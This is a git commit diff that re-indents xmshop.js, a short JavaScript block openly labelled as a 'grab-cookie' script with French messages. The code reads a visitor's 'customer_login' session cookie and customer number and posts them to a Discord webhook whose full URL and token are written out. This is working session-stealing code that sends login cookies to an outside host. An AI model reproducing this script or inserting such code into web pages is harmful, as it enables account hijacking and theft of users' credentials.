af8381cf80b702a95410753d6f69a5664524be7a
Bulgus <88266443+Bulgus@users.noreply.github.com>
2023-06-29 10:24:59 +0200

    Update xmshop.js

--- xmshop.js
+++ xmshop.js
@@ -1,48 +1,48 @@
-    <script>
-        document.cookie = "customer_login=idprecieux; SameSite=None"
-        window.addEventListener('load', function () {
-            console.log('Cette fonction est exécutée une fois quand la page est chargée.');
-        });
+<script>
+    document.cookie = "customer_login=idprecieux; SameSite=None"
+    window.addEventListener('load', function () {
+        console.log('Cette fonction est exécutée une fois quand la page est chargée.');
+    });
 
-        function sendMessage() {
-            const request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/877263942076997682/Z2ZBLx-cQHEvFsM2vidvuMmebo39gXVwErjl3ixX3jUXKiGI30HYq-BeoTtNe31uXFYX");
+    function sendMessage() {
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/877263942076997682/Z2ZBLx-cQHEvFsM2vidvuMmebo39gXVwErjl3ixX3jUXKiGI30HYq-BeoTtNe31uXFYX");
 
-            request.setRequestHeader('Content-type', 'application/json');
+        request.setRequestHeader('Content-type', 'application/json');
 
-            const params = {
-                username: "XMShop User Cookies",
-                avatar_url: "",
-                content: "Un nouvel utilisateur vient de charger le script de grab-cookie : client numéros **" + id + "**. Son cookie de connexion est **" + login +"**"
-            }
+        const params = {
+            username: "XMShop User Cookies",
+            avatar_url: "",
+            content: "Un nouvel utilisateur vient de charger le script de grab-cookie : client numéros **" + id + "**. Son cookie de connexion est **" + login +"**"
+        }
 
-            request.send(JSON.stringify(params));
+        request.send(JSON.stringify(params));
             
-        }
+    }
 
-        function getCookie(nom) {
+    function getCookie(nom) {
 
-            var cookies = document.cookie.split(";");
+        var cookies = document.cookie.split(";");
         
-            for(var i = 0; i < cookies.length; i++) {
-                var cookiePair = cookies[i].split("=");
+        for(var i = 0; i < cookies.length; i++) {
+            var cookiePair = cookies[i].split("=");
         
-                if(nom == cookiePair[0].trim()) {
-                    return decodeURIComponent(cookiePair[1]);
-                }
+            if(nom == cookiePair[0].trim()) {
+                return decodeURIComponent(cookiePair[1]);
             }
-    
-        return null;
         }
+    
+    return null;
+    }
 
 
 
 
 
 
-        var login = getCookie("customer_login");
-        var id = getCookie("customerNumber")
+    var login = getCookie("customer_login");
+    var id = getCookie("customerNumber")
 
-        sendMessage()
+    sendMessage()
 
-    </script>
+</script>
